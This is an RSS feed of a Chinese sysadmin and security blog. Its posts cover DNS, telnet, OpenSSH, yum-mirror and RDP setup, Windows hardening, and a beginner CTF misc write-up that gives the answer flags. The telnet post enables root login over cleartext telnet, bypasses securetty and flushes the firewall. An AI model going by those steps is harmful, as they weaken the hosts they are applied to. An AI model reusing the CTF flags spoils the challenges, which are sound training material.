<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Jaie</title>
    <link>https://jaie.cc/</link>
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Tue, 24 Dec 2019 08:27:27 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>windows server 2012 dns服务器搭建</title>
      <link>https://jaie.cc/2019/12/24/windows%20server2012%20dns%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</link>
      <guid>https://jaie.cc/2019/12/24/windows%20server2012%20dns%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</guid>
      <pubDate>Tue, 24 Dec 2019 08:23:33 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;1-安装dns服务器&quot;&gt;&lt;a href=&quot;#1-安装dns服务器&quot; class=&quot;headerlink&quot; title=&quot;1.安装dns服务器&quot;&gt;&lt;/a&gt;1.安装dns服务器&lt;/h3&gt;&lt;p&gt;打开服务器管理器，仪表板———&amp;gt;添加角色和功能，下一步下一步，到了服务
        
      
      </description>
      
      <content:encoded><![CDATA[<h3 id="1-安装dns服务器"><a href="#1-安装dns服务器" class="headerlink" title="1.安装dns服务器"></a>1.安装dns服务器</h3><p>打开服务器管理器，仪表板———&gt;添加角色和功能，下一步下一步，到了服务器角色打勾选择DNS服务器，然后等待安装完成，在所有应用中可以看到多了一个dns，点击打开<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021215438.png" alt></p><h3 id="2-创建正向主要区域"><a href="#2-创建正向主要区域" class="headerlink" title="2.创建正向主要区域"></a>2.创建正向主要区域</h3><p><strong>正向查找区域用于通过域名查询ip地址</strong><br>右键正向查找区域——&gt;新建区域——&gt;下一步，区域类型选择主要区域<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021221334.png" alt><br><br>区域名称是域名的意思，这里我test.com示范<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021221405.png" alt><br><br>区域文件，没有需求默认就好<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021221618.png" alt><br><br>不允许动态更新<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021221647.png" alt><br></p><h3 id="3-创建反向主要区域"><a href="#3-创建反向主要区域" class="headerlink" title="3.创建反向主要区域"></a>3.创建反向主要区域</h3><p><strong>反向查找区域用于通过ip地址查询dns名称</strong><br>右键反向查找区域——&gt;新建区域——&gt;下一步，区域类型选择主要区域，下一步ipv4方向查找区域<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021222124.png" alt><br><br>输入dns服务器的网络id<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021222403.png" alt><br><br>默认文件，并且不动态更新<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021222439.png" alt><br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021222455.png" alt><br></p><h3 id="4-创建资源记录-amp-测试"><a href="#4-创建资源记录-amp-测试" class="headerlink" title="4.创建资源记录&amp;测试"></a>4.创建资源记录&amp;测试</h3><h4 id="配置测试环境"><a href="#配置测试环境" class="headerlink" title="配置测试环境"></a>配置测试环境</h4><p>在客户端配置网卡dns服务器指向<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021222931.png" alt><br></p><h4 id="创建正向查找资源记录-amp-测试"><a href="#创建正向查找资源记录-amp-测试" class="headerlink" title="创建正向查找资源记录&amp;测试"></a>创建正向查找资源记录&amp;测试</h4><h5 id="1-建立test-com的域名解析"><a href="#1-建立test-com的域名解析" class="headerlink" title="1.建立test.com的域名解析"></a>1.建立test.com的域名解析</h5><p>右建test.com——&gt;新建主机，名称为空，ip为测试的ip，这里我用dns服务器的ip为测试,添加主机<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021234612.png" alt><br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021233617.png" alt><br></p><h5 id="2-建立www-test-com解析"><a href="#2-建立www-test-com解析" class="headerlink" title="2.建立www.test.com解析"></a>2.建立<a href="http://www.test.com解析" target="_blank" rel="noopener">www.test.com解析</a></h5><p>操作同1<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021222727.png" alt><br></p><h5 id="3-建立11-test-com解析到www-test-com"><a href="#3-建立11-test-com解析到www-test-com" class="headerlink" title="3.建立11.test.com解析到www.test.com"></a>3.建立11.test.com解析到<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></h5><p>右建test.com——&gt;新建别名，别名为11，完全限定的域名为默认，目标主机的完全合格的域名填<a href="http://www.test.com添加主机" target="_blank" rel="noopener">www.test.com添加主机</a><br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021234733.png" alt><br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021225242.png" alt><br></p><h5 id="4-测试正向解析域名"><a href="#4-测试正向解析域名" class="headerlink" title="4.测试正向解析域名"></a>4.测试正向解析域名</h5><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021235419.png" alt><br></p><h4 id="创建反向查找资源记录-amp-测试"><a href="#创建反向查找资源记录-amp-测试" class="headerlink" title="创建反向查找资源记录&amp;测试"></a>创建反向查找资源记录&amp;测试</h4><h5 id="1-创建反向查找资源记录"><a href="#1-创建反向查找资源记录" class="headerlink" title="1.创建反向查找资源记录"></a>1.创建反向查找资源记录</h5><p>右键反向区域名称——&gt;新建指针<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191021235919.png" alt><br><br>主机IP地址我这里选择dns服务器ip测试，限定域名为默认，主机名为<a href="http://www.test1.com" target="_blank" rel="noopener">www.test1.com</a><br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191022000058.png" alt><br><br>在建一个主机名为test的，操作同上<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191022000841.png" alt><br></p><h5 id="2-测试反向查找"><a href="#2-测试反向查找" class="headerlink" title="2.测试反向查找"></a>2.测试反向查找</h5><p>测试成功<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191022001102.png" alt><br></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/12/24/windows%20server2012%20dns%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/#disqus_thread</comments>
    </item>
    
    <item>
      <title>攻防时间misc新手区wp</title>
      <link>https://jaie.cc/2019/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E5%8C%BAwp/</link>
      <guid>https://jaie.cc/2019/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E5%8C%BAwp/</guid>
      <pubDate>Tue, 24 Dec 2019 07:47:58 GMT</pubDate>
      <description>
      
        
        
          &lt;h5 id=&quot;1-this-is-flag&quot;&gt;&lt;a href=&quot;#1-this-is-flag&quot; class=&quot;headerlink&quot; title=&quot;1.this_is_flag&quot;&gt;&lt;/a&gt;1.this_is_flag&lt;/h5&gt;&lt;p&gt;标线即为flag值&lt;/p&gt;
&lt;p&gt;&lt;img 
        
      
      </description>
      
      <content:encoded><![CDATA[<h5 id="1-this-is-flag"><a href="#1-this-is-flag" class="headerlink" title="1.this_is_flag"></a>1.this_is_flag</h5><p>标线即为flag值</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925193107.png" alt></p><h5 id="2-ext3"><a href="#2-ext3" class="headerlink" title="2.ext3"></a>2.ext3</h5><p>下载文件后放进linux，flie命令查看是什么文件，可以看到是磁盘文件，将其挂载</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925192125.png" alt></p><p>可以查看flag文本文件，cat查看得base64的编码，进行转换得flag值</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1569410688357.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925192912.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925193015.png" alt></p><h5 id="3-give-you-flag"><a href="#3-give-you-flag" class="headerlink" title="3.give_you_flag"></a>3.give_you_flag</h5><p>下载后是一张gif有一副二维码的图片，用Stegsolve保存二维码的图片</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1569411485042.png" alt></p><p>用ps软件修复二维码图片，二维码扫出来即为flag值</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925204440.png" alt></p><h5 id="4-pdf"><a href="#4-pdf" class="headerlink" title="4.pdf"></a>4.pdf</h5><p>下载后是一个pdf文件，将pdf转换word文件，我这里用wps自带转换</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925205144.png" alt></p><p>打开转换的word，删除图片或移动缩小图片，即可看见图片下藏着flag值</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925205403.png" alt></p><h5 id="5-stegano"><a href="#5-stegano" class="headerlink" title="5.stegano"></a>5.stegano</h5><p>将pdf用浏览器打开选择全选，复制到记事本里去，可以发现AABB的一段文字，是摩斯电码，A是点，B是划<br>等到-.-. — -. –. .-. .- - ..- .-.. .- - .. — -. … –..– ..-. .-.. .- –. —… .—- -. …- .—- ….. .—- -… .-.. …– – …– ….. ….. ….- –. …–转化成字母即为flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925210906.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925211421.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1569417314520.png" alt></p><p>flag格式是flag{1nv151bl3m3554g3}</p><h5 id="6-SimpleRAR"><a href="#6-SimpleRAR" class="headerlink" title="6.SimpleRAR"></a>6.SimpleRAR</h5><p>下载后是一个压缩包，用winhex查看一下，可以secret.png文件，把A8 3C 7A修改为A8 3C 74,这个是RAR对png文件头的编码.解压可以看到一张png图片，显示空白</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927152141.png" alt></p><p>再用winhex打开png图片，可以看到GIF文件头，GIF (gif)，文件头：47494638，把png文件格式改为gif</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927152912.png" alt></p><p>把gif发到stesolve跑一下，只弄出来一半。</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927165900.png" alt></p><p>再把gif丢进ps里，是两个图层的，导出另一图层的一张，再丢进stegsolve跑下，跑出二维码破碎的上部分</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927165340.png" alt></p><p>再报这两张图片丢进ps，ps修复一下，flag{yanji4n_bu_we1shi}</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1569575056008.png" alt></p><h5 id="7-坚持60s"><a href="#7-坚持60s" class="headerlink" title="7.坚持60s"></a>7.坚持60s</h5><p>用jd-gui 打开下载的java程序，搜索关键字flag，得到是base64编码进行转化</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925215533.png" alt></p><h5 id="8-gif"><a href="#8-gif" class="headerlink" title="8.gif"></a>8.gif</h5><p>下载是个压缩包，进行解压时一堆黑白的图片，可以联想二进制，白是0，黑是1二进制转换成字符串，得flag值</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925220606.png" alt></p><h5 id><a href="#" class="headerlink" title></a><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925220759.png" alt></h5><h5 id="9-掀桌子"><a href="#9-掀桌子" class="headerlink" title="9.掀桌子"></a>9.掀桌子</h5><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925221346.png" alt></p><p>每两个一组，将16进制转换为10进制，减去128以后输出 ascii</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925221212.png" alt></p><h5 id="10-如来十三掌"><a href="#10-如来十三掌" class="headerlink" title="10.如来十三掌"></a>10.如来十三掌</h5><p>打开是与佛论禅，到<a href="http://keyfc.net/bbs/tools/tudoucode.aspx解密，佛了。" target="_blank" rel="noopener">http://keyfc.net/bbs/tools/tudoucode.aspx解密，佛了。</a></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925231312.png" alt></p><p>解 rot-13 ，得到ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9<br>在base64解码flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925231346.png" alt></p><h5 id="11-base64stego"><a href="#11-base64stego" class="headerlink" title="11.base64stego"></a>11.base64stego</h5><p>下载来一个解压包，需要密码，伪加密来着，用winrar修复功能修复一下就可以打开了，打开一大串base64，应该是吧，直接解解不出来</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008195850.png" alt></p><p>参考<a href="https://www.tr0y.wang/2017/06/14/Base64steg/" target="_blank" rel="noopener">https://www.tr0y.wang/2017/06/14/Base64steg/</a>使用脚本处理一下</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008200132.png" alt></p><h5 id="12-功夫再高也怕菜刀"><a href="#12-功夫再高也怕菜刀" class="headerlink" title="12.功夫再高也怕菜刀"></a>12.功夫再高也怕菜刀</h5><p>下载下来是个流量包，binwalk跑一下，里面还包含一个zip，foremost分离文件  ，zip包需要密码，不是弱密码</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927103452.png" alt></p><p>分析流量包，搜索flag.txt关键字，在1150行，追踪tcp流量流，发现jpg十六进制加密，还原jpg图片，图片文字即压缩包密码，</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927115637.png" alt></p><p>flag值为：<img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927115842.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E5%8C%BAwp/#disqus_thread</comments>
    </item>
    
    <item>
      <title>linux开启配置telnet</title>
      <link>https://jaie.cc/2019/07/24/linux%E5%BC%80%E5%90%AF%E9%85%8D%E7%BD%AEtelnet/</link>
      <guid>https://jaie.cc/2019/07/24/linux%E5%BC%80%E5%90%AF%E9%85%8D%E7%BD%AEtelnet/</guid>
      <pubDate>Wed, 24 Jul 2019 15:26:17 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;1.安装telnet的必要软件&lt;br&gt;&lt;code&gt;yum install telnet telnet-server xinetd -y&lt;/code&gt;下载telnet、telnet、xinetd三个软件.&lt;br&gt;2.修改xinetd配置文件&lt;br&gt;&lt;code&gt;vim /etc
        
      
      </description>
      
      <content:encoded><![CDATA[<p>1.安装telnet的必要软件<br><code>yum install telnet telnet-server xinetd -y</code>下载telnet、telnet、xinetd三个软件.<br>2.修改xinetd配置文件<br><code>vim /etc/xinetd.d/telnet</code>把disable = no 从yes改为no<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710203750.png" alt><br>3.配置允许root登录<br>方法一：<code>vim /etc/pam.d/login</code>把修改 account    required     pam_nologin.so注释掉<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710204100.png" alt><br>方法二：<code>mv /etc/securetty /etc/securetty.bak</code>移除securetty文件</p><p>验证规则设置在/etc/security文件中，该文件定义root用户只能在tty1-tty6的终端上记录，删除该文件或者将其改名即可避开验证规则实现root用户远程登录。<br>4.重启服务本地测试<br><code>service xinetd restart</code>重新启动xinetd服务<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710204346.png" alt><br>在本机telnet自己，telnet 127.0.0.1 root用户登录成功<br> <code>iptables -F</code>关闭防火墙<br>远程成功登录<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710205716.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/07/24/linux%E5%BC%80%E5%90%AF%E9%85%8D%E7%BD%AEtelnet/#disqus_thread</comments>
    </item>
    
    <item>
      <title>linux opendssh 升级</title>
      <link>https://jaie.cc/2019/07/24/linux%20opendssh%20%E5%8D%87%E7%BA%A7/</link>
      <guid>https://jaie.cc/2019/07/24/linux%20opendssh%20%E5%8D%87%E7%BA%A7/</guid>
      <pubDate>Wed, 24 Jul 2019 15:26:07 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;1.在工作中遇到openshh升级问题，因为客户那边是内网很难搞，要升级openshh要装依赖，客户那边又不能联网，所以我在自己笔记本本地搭建了一个yum服务器，供客户那边linux下载软件包，然后openssh开启中途可能ssh服务不能用，解决这些问题后，我想到开启tel
        
      
      </description>
      
      <content:encoded><![CDATA[<p>1.在工作中遇到openshh升级问题，因为客户那边是内网很难搞，要升级openshh要装依赖，客户那边又不能联网，所以我在自己笔记本本地搭建了一个yum服务器，供客户那边linux下载软件包，然后openssh开启中途可能ssh服务不能用，解决这些问题后，我想到开启telnet服务，以防万一，万一Linux不能连接，客户不得拿刀砍我，，<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190719164633.png" alt></p><h5 id="1-开始工作"><a href="#1-开始工作" class="headerlink" title="1.开始工作"></a>1.开始工作</h5><p>查看系统版本、查看openssh版本，下载openssh最新包我这里是openshh8.0<br><code>shh -V</code>查看openssh版本，<br><code>rpm -qa|grep openssh</code>查看openssh相关包<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710205953.png" alt><br>2.安装必要软件<br><code>cp /etc/init.d/sshd /etc/init.d/sshd.bak</code>备份下sshd文件<br><code>yum -y install gcc pam pam-devel zlib zlib-devel openssl-devel</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710210938.png" alt><br>3.安装openshh<br>卸载旧的openssh  <code>rpm -e `rpm -qa | grep openssh` --nodeps</code><br>解压openssh安装包<code>tar -zxvf openssh-8.0p1.tar_2.gz</code><br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710210724.png" alt><br><code>./configure    --prefix=/usr  --sysconfdir=/etc/ssh  --with-md5-passwords --with-zlib --with-ssl-dir=/usr/local/ssl --with-privsep-path=/var/lib/sshd</code>   </p><pre><code class="make```">```make install</code></pre><p>安装完成<br><br>如果遇到报错chmod 600 /etc/ssh/ssh_host_*<br>输入这些命令<br><code>`</code>install -v -m755 contrib/ssh-copy-id /usr/bin</p><p>install -v -m644 contrib/ssh-copy-id.1 /usr/share/man/man1</p><p>install -v -m755 -d /usr/share/doc/openssh-8.0p1</p><p>install -v -m644 INSTALL LICENCE OVERVIEW README* /usr/share/doc/openssh-8.0p1<br><code>ssh -V</code>测试一下现在的版本是多少了，openssh  8.0了<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710213013.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/07/24/linux%20opendssh%20%E5%8D%87%E7%BA%A7/#disqus_thread</comments>
    </item>
    
    <item>
      <title>搭建本地yum服务器</title>
      <link>https://jaie.cc/2019/07/24/%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0yum%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <guid>https://jaie.cc/2019/07/24/%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0yum%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <pubDate>Wed, 24 Jul 2019 15:25:33 GMT</pubDate>
      <description>
      
        
        
          &lt;h5 id=&quot;1-在linux安装apache&quot;&gt;&lt;a href=&quot;#1-在linux安装apache&quot; class=&quot;headerlink&quot; title=&quot;1.在linux安装apache&quot;&gt;&lt;/a&gt;1.在linux安装apache&lt;/h5&gt;&lt;p&gt;我这里是拿kali虚拟机自带
        
      
      </description>
      
      <content:encoded><![CDATA[<h5 id="1-在linux安装apache"><a href="#1-在linux安装apache" class="headerlink" title="1.在linux安装apache"></a>1.在linux安装apache</h5><p>我这里是拿kali虚拟机自带的apache做中间件。<br><code>dpkg  -L apache2</code>查看apache相关的文件,在/var/www下web网页放置<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710202523.png" alt>  </p><h5 id="2-虚拟机挂载cent光盘"><a href="#2-虚拟机挂载cent光盘" class="headerlink" title="2.虚拟机挂载cent光盘"></a>2.虚拟机挂载cent光盘</h5><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710220103.png" alt><br><code>df -h</code> 列出文件系统、找出光盘的文件系统，<br><code>mount /dev/sr1 /mnt/cdrom</code>挂载/dev/sr1到/mnt/cdrom<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710220701.png" alt></p><h5 id="3-将光盘的安装包拷贝到web目录下"><a href="#3-将光盘的安装包拷贝到web目录下" class="headerlink" title="3.将光盘的安装包拷贝到web目录下"></a>3.将光盘的安装包拷贝到web目录下</h5><p><code>mkdir /var/www/centos</code> 创建目录 /var/www/centos <br><br><code>mkdir /var/www/centos/x86_64</code>创建目录/var/www/centos/x86_64<br><br><code>mkdir /var/www/centos/extra</code>创建目录/var/www/centos/extra<br><br><code>mkdir /var/www/centos/update</code>创建目录/var/www/centos/update<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710222523.png" alt><br><br><code>cd /mnt/cdrom/</code><br><br><code>ls</code>进入挂载光盘的目录  查看光盘文件<br><code>cp Packages/* /var/www/centos/x86_64/</code> 把 Packages/下的软件包复制到/var/www/centos/x86_64/目录下，<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710221216.png" alt><br><code>apt-get install -y createrepo</code>下载createrepo，目的是生成repodata目录<br><br><code>createrepo -pdo /var/www/centos/x86_64 /var/www/centos/x86_64</code><br><br><code>createrepo -pdo /var/www/centos/extra /var/www/centos/extra</code><br><br><code>createrepo -pdo /var/www/centos/update /var/www/centos/eupdate</code><br><br>重启一下apache服务<code>service apache2 restart</code><br><br>测试访问web网页，ip为虚拟机的<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710223500.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710223704.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710231018.png" alt><br><br>4.客户端配置访问yum源服务器<br><code>vim /etc/yum.repos.d/CentOS-Base.repo</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190719170252.png" alt><br><code>yum clean all</code> 清除所有缓存<br><code>yum makecache</code> 重新下载缓存<br>可以发现已经可以了，现在测试一下，下载一个tree包试一下<br><code>yum install tree -y</code><br><br>可能cdrom里面的包不够多，我们同步一下163远程的包，用rsync协议<br><code>rsync -avrt --delete rsync://mirrors.163.com/centos/6/updates/x86_ 64/Packages/ /var/www/centos/update</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710234653.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/07/24/%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0yum%E6%9C%8D%E5%8A%A1%E5%99%A8/#disqus_thread</comments>
    </item>
    
    <item>
      <title>修改远程桌面3389端口</title>
      <link>https://jaie.cc/2019/07/02/%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A23389%E7%AB%AF%E5%8F%A3/</link>
      <guid>https://jaie.cc/2019/07/02/%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A23389%E7%AB%AF%E5%8F%A3/</guid>
      <pubDate>Tue, 02 Jul 2019 14:55:02 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;在修改前在防火墙添加修改远程端口的允许通过的策略，或者暂时关闭防火墙，不然修改完端口号远程连接不上。&lt;br&gt;&lt;br&gt;运行regedit找到注册表&lt;br&gt;[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
        
      
      </description>
      
      <content:encoded><![CDATA[<p>在修改前在防火墙添加修改远程端口的允许通过的策略，或者暂时关闭防火墙，不然修改完端口号远程连接不上。<br><br>运行regedit找到注册表<br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] PortNumber位置，点击十进制，修改远程连接的端口号，这里以4567为列。<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190702193333.png" alt><br><br> 找到注册表[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] 双击右边 PortNumber-点十进制-更改值为：4567<br> 使其注册表生效，这里windows server2008/2012 为例，重启生效，<br> 或者运行service.msc，找到remote desktop service服务管理重启生效<br><br> 这里以windows server2008/2012 为例，像xp、server2003比较旧的系统是没有remote desktop service服务,需要重启才能生效<br><br> <img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/Snipaste_2019-07-02_21-38-17.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190702215102.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190702215325.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/07/02/%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A23389%E7%AB%AF%E5%8F%A3/#disqus_thread</comments>
    </item>
    
    <item>
      <title>windows服务器主机加固</title>
      <link>https://jaie.cc/2019/06/15/windows%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BB%E6%9C%BA%E5%8A%A0%E5%9B%BA/</link>
      <guid>https://jaie.cc/2019/06/15/windows%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BB%E6%9C%BA%E5%8A%A0%E5%9B%BA/</guid>
      <pubDate>Sat, 15 Jun 2019 12:07:36 GMT</pubDate>
      <description>
      
        
        
          &lt;h4 id=&quot;1-禁用Guest账户和无关账户&quot;&gt;&lt;a href=&quot;#1-禁用Guest账户和无关账户&quot; class=&quot;headerlink&quot; title=&quot;1.禁用Guest账户和无关账户&quot;&gt;&lt;/a&gt;1.禁用Guest账户和无关账户&lt;/h4&gt;&lt;p&gt;Guest账户为黑客入侵打开
        
      
      </description>
      
      <content:encoded><![CDATA[<h4 id="1-禁用Guest账户和无关账户"><a href="#1-禁用Guest账户和无关账户" class="headerlink" title="1.禁用Guest账户和无关账户"></a>1.禁用Guest账户和无关账户</h4><p>Guest账户为黑客入侵打开了方便之门，黑客使用Guest账户可以进行提权。禁用Guest账户是最好的选择。<br>操作流程：进入“控制面板-&gt;管理工具-&gt;计算机管理-&gt;本地用户和组-&gt;用户-&gt;Guest”<br>“账户已禁用”打勾启用<br><strong>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615152823.png" alt>   </p><h4 id="2-密码策略加强"><a href="#2-密码策略加强" class="headerlink" title="2.密码策略加强"></a>2.密码策略加强</h4><p>  操作系统、用户身份鉴别信息应具有不易被冒用的特点，口令应复杂度要求并定期更换。<br>  操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“帐户策略-&gt;密码策略”;<br></p><blockquote><p>“密码必须符合复杂度要求” 设 置为“启用” <br><br>“密码长度最小值”设置为“8个字符”<br><br>“密码最长使用期限”设置为“90天”<br><br>“强制密码历史”设置为“记住5个密码”<br><br>“用可以还原的加密来存储密码”设置为“禁用”<br>  </p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615153540.png" alt><br><strong>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615153659.png" alt>   </p><h4 id="3-账户锁定策略加强"><a href="#3-账户锁定策略加强" class="headerlink" title="3.账户锁定策略加强"></a>3.账户锁定策略加强</h4><p>对于采用静态口令认证技术的设备，应配置当用户连续认证失败次数超过5 次（不含5 次），锁定该用户使用的账号。<br>操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“帐户策略-&gt;帐户锁定策略”：</p><blockquote><p>“账户额锁定阀值”设置为 5 次<br><br>“账户锁定时间”设置为 15分钟<br><br>“复位账户锁定计数器”设置为 15分钟<br></p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615153915.png" alt><br><strong>加固后</strong><br><img 